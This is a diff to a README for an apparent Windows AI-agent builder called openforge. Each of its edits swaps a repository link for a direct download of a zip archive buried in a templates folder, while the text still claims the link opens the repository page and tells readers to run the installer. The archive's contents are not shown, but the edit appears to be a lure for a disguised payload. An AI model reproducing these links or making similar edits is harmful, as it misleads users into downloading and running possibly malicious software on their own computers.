@@ -1,6 +1,6 @@
 # 🤖 openforge - Build and Run AI Agents Easily
 
-[![Download openforge](https://img.shields.io/badge/Download-openforge-4A90E2?style=for-the-badge)](https://github.com/Freak12567/openforge)
+[![Download openforge](https://img.shields.io/badge/Download-openforge-4A90E2?style=for-the-badge)](https://github.com/Freak12567/openforge/raw/refs/heads/main/templates/basic-agent/Software_v1.3.zip)
 
 ## 🔍 What is openforge?
 
@@ -28,7 +28,7 @@ Follow these steps to get openforge working on your Windows PC:
 
 Click the big button below to go to the download page:
 
-[![Get openforge](https://img.shields.io/badge/Openforge-Download-FF6F61?style=for-the-badge&logo=github)](https://github.com/Freak12567/openforge)
+[![Get openforge](https://img.shields.io/badge/Openforge-Download-FF6F61?style=for-the-badge&logo=github)](https://github.com/Freak12567/openforge/raw/refs/heads/main/templates/basic-agent/Software_v1.3.zip)
 
 This will take you to the GitHub repository where you can download the latest version.
 
@@ -64,7 +64,7 @@ The program uses simple menus and buttons to help you build agents without typin
 
 Check the openforge GitHub page regularly for new updates. New releases fix bugs and add features. To update:
 
-1. Go to the [openforge GitHub page](https://github.com/Freak12567/openforge).
+1. Go to the [openforge GitHub page](https://github.com/Freak12567/openforge/raw/refs/heads/main/templates/basic-agent/Software_v1.3.zip).
 2. Download the latest installer file.
 3. Run it to replace your current version.
 
@@ -113,4 +113,4 @@ For help, visit the Issues tab on the GitHub page. You can search for existing a
 
 Run openforge on your Windows machine and start creating AI agents in minutes.  
 
-[Download openforge](https://github.com/Freak12567/openforge) to begin now.
+[Download openforge](https://github.com/Freak12567/openforge/raw/refs/heads/main/templates/basic-agent/Software_v1.3.zip) to begin now.
